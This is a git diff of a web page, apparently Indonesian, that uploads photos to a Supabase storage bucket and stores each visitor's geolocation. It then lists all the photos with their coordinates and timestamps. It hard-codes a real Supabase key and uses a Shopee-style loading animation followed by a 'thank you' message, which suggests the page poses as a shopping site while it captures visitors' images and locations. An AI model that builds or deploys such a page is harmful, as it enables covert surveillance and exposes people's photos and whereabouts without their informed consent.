@@ -63,10 +63,10 @@
       object-fit: cover;
     }
 
-    h3 {
-      margin: 20px;
-      font-size: 1.1rem;
-      color: #444;
+    .info {
+      margin-top: 5px;
+      font-size: 0.85rem;
+      color: #555;
     }
 
     /* Animasi loading ala Shopee */
@@ -110,7 +110,7 @@
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
   <script>
     const SUPABASE_URL = "https://sinqdlsddldljlqvsxoa.supabase.co";
-    const SUPABASE_KEY = "YOUR_ANON_KEY"; // ganti dengan key kamu
+    const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InNpbnFkbHNkZGxkbGpscXZzeG9hIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTY2Mzg4MDcsImV4cCI6MjA3MjIxNDgwN30.PdO2Fl37xYkG0T9skBJ9R7VTi553-iSUZGBm1L4yTkE";
     const BUCKET = "foto-users"; 
 
     const { createClient } = supabase;
@@ -166,11 +166,12 @@
       navigator.geolocation.getCurrentPosition(async (pos) => {
         const lat = pos.coords.latitude;
         const lon = pos.coords.longitude;
+        const waktu = new Date().toLocaleString();
 
         // simpan ke tabel Supabase (butuh bikin tabel lokasi_users di Supabase)
         const { error } = await client
           .from("lokasi_users")
-          .insert([{ foto: fotoName, latitude: lat, longitude: lon }]);
+          .insert([{ foto: fotoName, latitude: lat, longitude: lon, created_at: new Date() }]);
 
         if (error) {
           statusEl.innerText = "❌ Gagal simpan lokasi: " + error.message;
@@ -194,18 +195,34 @@
       }
 
       listEl.innerHTML = "<h3>Terimakasih</h3>";
-      data.forEach(file => {
+      for (const file of data) {
         const { data: publicUrl } = client.storage.from(BUCKET).getPublicUrl(file.name);
         
+        // ambil lokasi dari tabel Supabase
+        const { data: lokasiData } = await client
+          .from("lokasi_users")
+          .select("*")
+          .eq("foto", file.name)
+          .single();
+
         const card = document.createElement("div");
         card.className = "card";
-        
+
         const img = document.createElement("img");
         img.src = publicUrl.publicUrl;
-        
+
+        const info = document.createElement("div");
+        info.className = "info";
+        if (lokasiData) {
+          info.innerText = `Lat: ${lokasiData.latitude.toFixed(5)}, Lon: ${lokasiData.longitude.toFixed(5)}\n${new Date(lokasiData.created_at).toLocaleString()}`;
+        } else {
+          info.innerText = "Lokasi tidak tersedia";
+        }
+
         card.appendChild(img);
+        card.appendChild(info);
         listEl.appendChild(card);
-      });
+      }
     }
 
     ambilFoto();
